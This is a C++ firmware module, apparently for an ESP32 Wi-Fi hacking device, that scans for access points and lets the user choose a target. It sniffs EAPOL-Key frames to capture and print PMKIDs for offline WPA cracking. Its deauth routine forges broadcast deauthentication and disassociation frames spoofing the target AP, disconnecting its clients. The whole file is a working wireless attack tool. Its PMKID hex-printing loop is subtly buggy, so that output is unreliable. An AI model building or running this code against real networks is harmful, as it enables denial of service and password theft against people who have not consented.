#include "wifi/PMKIDApp.h"
#include "DisplayManager.h"

#define TAG "PMKID"

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t deauthPacket[26] = {
  0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
  0x00, 0x00,                         // duration (SDK takes care of that)
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
  0x00, 0x00,                         // fragment & squence number
  0x01, 0x00                          // reason code (1 = unspecified reason)
};

extern WIFIApp wifiApp;
extern AllClientsDisconnectedCallback g_disconnected_callback;

int chosenAPID = -1;
int networkCount = 0;
int pmkidFoundCount = 0;
int shownPMKIDTargetIndex = 0;
TaskHandle_t pmkidTaskHandle = NULL;
PMKIDState pmkidState = WIFI_PMKID_STATE_HOME;

uint8_t PMKIDApp::channel = 0;

// tell websocket clients to ask for new results
void PMKIDApp::sendOutput(String msg) {
  JsonDocument doc;
  String res;

  doc["app"] = APP_ID_WIFI_PMKID;
  doc["output"] = msg;
  serializeJson(doc, res);
  WebServerModule::notifyClients(res);
};

void PMKIDApp::sendState(int state) {
  JsonDocument doc;
  String res;

  doc["app"] = APP_ID_WIFI_PMKID;
  doc["channel"] = (int)PMKIDApp::channel;
  doc["state"] = state;
  serializeJson(doc, res);
  WebServerModule::notifyClients(res);
};

void PMKIDApp::on_rx_packet(void *buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;

  switch (type) {
    case WIFI_PKT_DATA: {
      data_frame_t* pkt = (data_frame_t*)packet->payload;
      uint8_t* body = pkt->body;
      
      if (pkt->mac_header.frame_control.protected_frame == 1) {
        return;
      }

      if (pkt->mac_header.frame_control.subtype > 7) {
        // Skipping QoS field (2 bytes)
        body += 2;
      }

      // Skipping LLC SNAP header (6 bytes)
      body += 6;

      // ETHER_TYPE_EAPOL
      uint16_t ether_type = ntohs(*(uint16_t *)body);

      if (ether_type == 0x888e) {
        // EAPOL Packet
        body += 2;

        eapol_packet_t* eapol = (eapol_packet_t*)body;
        uint8_t packet_type = eapol->header.packet_type;

        // EAPOL_KEY
        if (packet_type == 3) {
          body += 2; // body should now point to eapol_key_packet_t

          eapol_key_packet_t* eapol_key = (eapol_key_packet_t*)eapol->packet_body;

          uint8_t encrypted_key_data = eapol_key->key_information.encrypted_key_data;
          uint16_t key_data_length = eapol_key->key_data_length;

          if (key_data_length == 0) {
            return;
          }

          if (encrypted_key_data == 1) {
            ESP_LOGI(TAG, "DATA encrypted.");
            return;
          }

          uint16_t kdl = ntohs(eapol_key->key_data_length);
          uint8_t *key_data_index = eapol_key->key_data;
          uint8_t *key_data_max_index = eapol_key->key_data + kdl;
          key_data_field_t *key_data_field;

          do {
            key_data_field = (key_data_field_t *) key_data_index;

            ESP_LOGD(TAG, "EAPOL-Key -> Key-Data -> type=%x; length=%x; oui=%x; data_type=%x",
                    key_data_field->type, 
                    key_data_field->length, 
                    key_data_field->oui,
                    key_data_field->data_type);
        
            if (key_data_field->type != KEY_DATA_TYPE) {
              ESP_LOGD(TAG, "Wrong type %x (expected %x)", key_data_field->type, KEY_DATA_TYPE);
              continue;
            }

            if (ntohl(key_data_field->oui) != KEY_DATA_OUI_IEEE80211) {
              ESP_LOGD(TAG, "Wrong OUI %x (expected %x)", key_data_field->oui, KEY_DATA_OUI_IEEE80211);
              continue;
            }

            if (key_data_field->data_type != KEY_DATA_DATA_TYPE_PMKID_KDE) {
              ESP_LOGD(TAG, "Wrong data type %x (expected %x)", key_data_field->data_type, KEY_DATA_DATA_TYPE_PMKID_KDE);
              continue;
            }
            
            char out[100];
            sprintf(out, "Found PMKID: %02x:%02x:%02x:%02x:%02x:%02x -> %02x:%02x:%02x:%02x:%02x:%02x",
              pkt->mac_header.addr3[0], pkt->mac_header.addr3[1], pkt->mac_header.addr3[2],
              pkt->mac_header.addr3[3], pkt->mac_header.addr3[4], pkt->mac_header.addr3[5],
              pkt->mac_header.addr1[0], pkt->mac_header.addr1[1], pkt->mac_header.addr1[2],
              pkt->mac_header.addr1[3], pkt->mac_header.addr1[4], pkt->mac_header.addr1[5]);
            ESP_LOGI(TAG, "%s", out);
            PMKIDApp::sendOutput(out);

            memset(out, 0, 100);

            for (unsigned i = 0; i < key_data_field->length; i++) {
              sprintf(&out[i], "%02x", key_data_field->data[i]);
            }

            ESP_LOGI(TAG, "%s", out);
            PMKIDApp::sendOutput(out);
            
            leds->blink(0, 0, 255, 2);
            pmkidFoundCount++;

          } while((key_data_index = key_data_field->data + key_data_field->length - 4 + 1) < key_data_max_index);
        }
      }
      break;
    }
    default:
      break;
  }
};

void PMKIDApp::scan(void* params) {
  PMKIDApp::scan();
  vTaskDelete(NULL);
};

void PMKIDApp::scan() {
  leds->set_color(0, 0, 255);
  pmkidState = WIFI_PMKID_STATE_SCANNING;
  PMKIDApp::sendState((int)pmkidState);
  networkCount = WiFi.scanNetworks(false, true);

  leds->blink(0, 255, 0, 2);
  leds->set_color(0, 255, 0);
  
  JsonDocument doc;
  String res;

  doc["app"] = APP_ID_WIFI_PMKID;
  doc["scan_done"] = true;
  serializeJson(doc, res);
  WebServerModule::notifyClients(res);

  pmkidState = WIFI_PMKID_STATE_SELECT_TARGET;
  PMKIDApp::sendState((int)pmkidState);
  return;
};

void PMKIDApp::stop_detect() {
  pmkidState = WIFI_PMKID_STATE_HOME;
  PMKIDApp::sendState((int)pmkidState);

  leds->blink(255, 0, 0, 2);

  if (pmkidTaskHandle != NULL) { 
    vTaskDelete(pmkidTaskHandle);
    pmkidTaskHandle = NULL;
  }
  
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  pmkidFoundCount = 0;
  chosenAPID = -1;
};

void PMKIDApp::start_detect() {
  esp_err_t ret = xTaskCreate(&PMKIDApp::_task, "pmkid", 16000, NULL, 1, &pmkidTaskHandle);
  if (ret == ESP_FAIL) {
    ESP_LOGE(TAG, "pmkid task err: %s", esp_err_to_name(ret));
  }
  pmkidState = WIFI_PMKID_STATE_RUNNING;
  PMKIDApp::sendState((int)pmkidState);
};

void PMKIDApp::_task(void *taskParams) {
  wifi_promiscuous_filter_t filter = { .filter_mask = 0 };
  filter.filter_mask |= WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(PMKIDApp::on_rx_packet);
  esp_wifi_set_promiscuous(true);

  char out[50];
  uint8_t chan;
  wifi_second_chan_t q;
  esp_wifi_get_channel(&chan, &q);

  sprintf(out, "Listening on Channel: %i", (int)chan);
  ESP_LOGI(TAG, "%s", out);
  PMKIDApp::sendOutput(out);

  leds->blink(0, 255, 0);

  while (1) {
    vTaskDelay(10 / portTICK_PERIOD_MS);
  }
};

void PMKIDApp::send_packet(uint8_t* packet, uint16_t packetSize, int times) {
  for (int i = 0; i < times; i++) {
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA,
                            packet,
                            packetSize,
                            false);
    if (ret != ESP_OK) {
      ESP_LOGI(TAG, "Failed to send pkt: %s", esp_err_to_name(ret));
      vTaskDelay(700 / portTICK_PERIOD_MS);
      
    }
  }
};

void PMKIDApp::on_all_sta_disconnect() {
  g_disconnected_callback = NULL;

  esp_err_t ret = esp_wifi_set_channel(PMKIDApp::channel, WIFI_SECOND_CHAN_NONE);
  if (ret != ESP_OK) {
    ESP_LOGI(TAG, "Failed to set WiFi channel: %s", esp_err_to_name(ret));
  } else {
    ESP_LOGI(TAG, "Channel set success: %i", (int)PMKIDApp::channel);
  }

  uint8_t chanv;
  wifi_second_chan_t q;
  ret = esp_wifi_get_channel(&chanv, &q);
  if (ret != ESP_OK) {
    ESP_LOGI(TAG, "Failed to get WiFi channel: %s", esp_err_to_name(ret));
  }

  char out[32];
  sprintf(out, "Starting on channel: %i", (int)chanv);
  vTaskDelay(200 / portTICK_PERIOD_MS);

  ESP_LOGI(TAG, "%s", out);
  PMKIDApp::sendOutput(out);
  PMKIDApp::start_detect();
};

void PMKIDApp::deauth() {
  uint8_t apMac[6];
  ESP_LOGI(TAG, "BSSID: %s", WiFi.BSSIDstr(chosenAPID).c_str());
  WiFi.BSSID(chosenAPID, apMac);

  uint16_t packetSize = sizeof(deauthPacket);
  uint8_t deauthpkt[packetSize];
  memcpy(deauthpkt, deauthPacket, packetSize);
  memcpy(&deauthpkt[4], broadcast, 6);
  memcpy(&deauthpkt[10], apMac, 6);
  memcpy(&deauthpkt[16], apMac, 6);
  deauthpkt[24] = 0x01; // reason

  // send deauth frame
  deauthpkt[0] = 0xc0;

  send_packet(deauthpkt, packetSize, 5);

  // send disassociate frame
  uint8_t disassocpkt[packetSize];

  memcpy(disassocpkt, deauthpkt, packetSize);

  disassocpkt[0] = 0xa0;

  send_packet(disassocpkt, packetSize, 5);

  ESP_LOGI(TAG, "Sent Deauth Frames.");
  PMKIDApp::sendOutput("Sent Deauth Frames.");
};

void PMKIDApp::webEvent(PMKIDWebEventParams *ps) {
  ESP_LOGI(TAG, "Web: %s", ps->action);
  JsonDocument doc;
  String res;

  if (strcmp(ps->action, "status") == 0) {
    doc["app"] = APP_ID_WIFI_PMKID;
    doc["channel"] = (int)PMKIDApp::channel;
    doc["state"] = (int)pmkidState;
    serializeJson(doc, res);
    return WebServerModule::notifyClients(res);
  }

  if (strcmp(ps->action, "deauth") == 0) {
    if (pmkidState != WIFI_PMKID_STATE_RUNNING) {
      doc["app"] = APP_ID_WIFI_PMKID;
      doc["success"] = false;
      doc["error"] = "Needs to be running";
      serializeJson(doc, res);
      return WebServerModule::notifyClients(res);
    }

    PMKIDApp::deauth();
  }

  if (strcmp(ps->action, "scan") == 0) {
    DisplayManager::appRunning = true;
    leds->stop_animations();
    wifiApp = WIFI_APP_PMKID;
    DisplayManager::setMenu(WIFI_MENU);
    xTaskCreate(&PMKIDApp::scan, "pmkidscan", 4000, NULL, 0, NULL);
  }

  if (strcmp(ps->action, "start") == 0) {
    uint8_t chan = (uint8_t)WiFi.channel(ps->ap_id);

    if (chan < 1 || chan > 12) {
      doc["app"] = APP_ID_WIFI_PMKID;
      doc["success"] = false;
      doc["error"] = "Invalid ap_id";
      serializeJson(doc, res);
      return WebServerModule::notifyClients(res);
    }

    chosenAPID = ps->ap_id;
    PMKIDApp::channel = chan;
    g_disconnected_callback = PMKIDApp::on_all_sta_disconnect;

    DisplayManager::appRunning = true;
    leds->stop_animations();
    wifiApp = WIFI_APP_PMKID;
    DisplayManager::setMenu(WIFI_MENU);
    
    doc["app"] = APP_ID_WIFI_PMKID;
    doc["success"] = true;
    serializeJson(doc, res);
    WebServerModule::notifyClients(res);
    
    esp_wifi_deauth_sta(0);
  }

  if (strcmp(ps->action, "stop") == 0) {
    PMKIDApp::stop_detect();
    DisplayManager::appRunning = false;
    wifiApp = WIFI_APP_NONE;
    DisplayManager::setMenu(MAIN_MENU);
    vTaskDelay(2000 / portTICK_PERIOD_MS);
  }

  if (strcmp(ps->action, "results") == 0) {
    JsonArray data = doc["results"].to<JsonArray>();
    
    for (int i = 0; i < networkCount; i++) {
      String bssid = WiFi.BSSIDstr(i);
      JsonObject obj = data.add<JsonObject>();
      String macAddress = WiFi.BSSIDstr(i);
      String ssid = WiFi.SSID(i);
      int rssi = WiFi.RSSI(i);
      int chan = (int)WiFi.channel(i);

      obj["id"] = i;
      obj["mac"] = macAddress;
      obj["ssid"] = ssid.length() > 0 ? ssid : "";
      obj["rssi"] = rssi;
      obj["channel"] = chan;
    }

    doc["app"] = APP_ID_WIFI_PMKID;
    serializeJson(doc, res);
    return WebServerModule::notifyClients(res);
  }
};

void PMKIDApp::ontouch(int pad, const char* type, uint32_t value) {
  switch (pad) {
    case LEFT: {
      if (pmkidState == WIFI_PMKID_STATE_SELECT_TARGET) {
        if (shownPMKIDTargetIndex == 0) {
          shownPMKIDTargetIndex = (networkCount - 1);
        } else {
          shownPMKIDTargetIndex -= 1;
        }

        return;
      }
      break;
    }
    case RIGHT: {
      if (pmkidState == WIFI_PMKID_STATE_SELECT_TARGET) {
        if (shownPMKIDTargetIndex == (networkCount - 1)) {
          shownPMKIDTargetIndex = 0;
        } else {
          shownPMKIDTargetIndex += 1;
        }

        return;
      }
      break;
    }
    case MIDDLE: {
      if (strcmp(type, "longPress") == 0) {
        switch (pmkidState) {
          case WIFI_PMKID_STATE_HOME: {
            wifiApp = WIFI_APP_NONE;
            DisplayManager::appRunning = false;
            return;
          }
          case WIFI_PMKID_STATE_SCANNING:
          case WIFI_PMKID_STATE_SELECT_TARGET:        
          case WIFI_PMKID_STATE_RUNNING: {
            shownPMKIDTargetIndex = 0;
            chosenAPID = -1;
            stop_detect();
            pmkidState = WIFI_PMKID_STATE_HOME;
            PMKIDApp::sendState((int)pmkidState);
            return;
          }
          default:
            break;
        }
      }

      switch (pmkidState) {
        case WIFI_PMKID_STATE_HOME: {
          scan();
          break;
        }
        case WIFI_PMKID_STATE_SELECT_TARGET: {
          chosenAPID = shownPMKIDTargetIndex;
          PMKIDApp::channel = (uint8_t)WiFi.channel(chosenAPID);

          if (WebServerModule::client_count > 0) {
            g_disconnected_callback = PMKIDApp::on_all_sta_disconnect;
            esp_wifi_deauth_sta(0);
          } else {
            PMKIDApp::on_all_sta_disconnect();
          }
          break;
        }
        case WIFI_PMKID_STATE_RUNNING: {
          PMKIDApp::deauth();
          break;
        }
        default:
          break;
      }
      
      break;
    }
  }
};

void PMKIDApp::render() {
  switch (pmkidState) {
    case WIFI_PMKID_STATE_HOME: {
      display->centeredText("wifi/pmkid", 0);
      display->text("", 1);
      display->centeredText("start", 2);
      display->text("", 3);
      break;
    }
    case WIFI_PMKID_STATE_SCANNING: {
      display->centeredText("wifi/pmkid", 0);
      display->text("", 1);
      display->centeredText("scanning", 2);
      display->centeredText("aps", 3);
      break;
    }
    case WIFI_PMKID_STATE_SELECT_TARGET: {
      char line[24];
      snprintf(line, sizeof(line), "%i/%i",
              shownPMKIDTargetIndex+1,
              networkCount);
      display->centeredText(line, 0);
      display->text(WiFi.SSID(shownPMKIDTargetIndex).c_str(), 1);
      display->text(WiFi.BSSIDstr(shownPMKIDTargetIndex).c_str(), 2);
      snprintf(line, sizeof(line), "CH:%2ld  RSSI:%4ld",
              WiFi.channel(shownPMKIDTargetIndex),
              WiFi.RSSI(shownPMKIDTargetIndex));
      display->centeredText(line, 3);
      break;
    }
    case WIFI_PMKID_STATE_RUNNING: {
      display->centeredText("wifi/pmkid", 0);
      display->text("", 1);
      display->centeredText("running", 2);
      char out[14];
      sprintf(out, "found: %i", pmkidFoundCount);
      display->centeredText(out, 3);
      break;
    }
    default:
      break;
  }

  vTaskDelay(20 / portTICK_PERIOD_MS);
};